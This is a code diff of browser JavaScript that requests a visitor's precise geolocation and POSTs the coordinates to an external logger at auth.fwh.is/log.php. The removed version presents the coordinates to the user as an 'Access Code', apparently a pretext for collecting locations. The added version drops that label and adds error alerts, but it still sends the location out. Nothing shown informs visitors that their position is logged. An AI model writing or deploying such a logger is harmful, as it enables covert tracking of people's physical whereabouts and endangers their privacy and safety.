@@ -1,37 +1,47 @@
-<script>
 function getLocation() {
-    if (!navigator.geolocation) {
-        document.getElementById("location").innerText = "Geolocation not supported.";
-        return;
-    }
-
+  if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition, showError, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
     });
+  } else {
+    document.getElementById("location").innerText = "Geolocation is not supported by this browser.";
+  }
 }
 
 function showPosition(position) {
-    const lat = position.coords.latitude;
-    const lng = position.coords.longitude;
+  let lat = position.coords.latitude;
+  let lng = position.coords.longitude;
 
-    document.getElementById("location").innerText =
-        "Access Code: LAT " + lat + ", LNG " + lng;
+  document.getElementById("location").innerText =
+    "Latitude: " + lat + ", Longitude: " + lng;
 
-    // 🔥 Send to your InfinityFree PHP logger
-    fetch("https://auth.fwh.is/log.php", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "lat=" + encodeURIComponent(lat) + "&lng=" + encodeURIComponent(lng)
-    });
+  // 🔥 Send data to InfinityFree backend
+  fetch("https://auth.fwh.is/log.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "lat=" + lat + "&lng=" + lng
+  })
+  .then(response => response.text())
+  .then(data => console.log("Server response:", data))
+  .catch(error => console.error("Error:", error));
 }
 
 function showError(error) {
-    document.getElementById("location").innerText =
-        "Error: " + error.message;
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      alert("User denied the request for Geolocation.");
+      break;
+    case error.POSITION_UNAVAILABLE:
+      alert("Location information is unavailable.");
+      break;
+    case error.TIMEOUT:
+      alert("The request to get user location timed out.");
+      break;
+    case error.UNKNOWN_ERROR:
+      alert("An unknown error occurred.");
+      break;
+  }
 }
-</script>
 
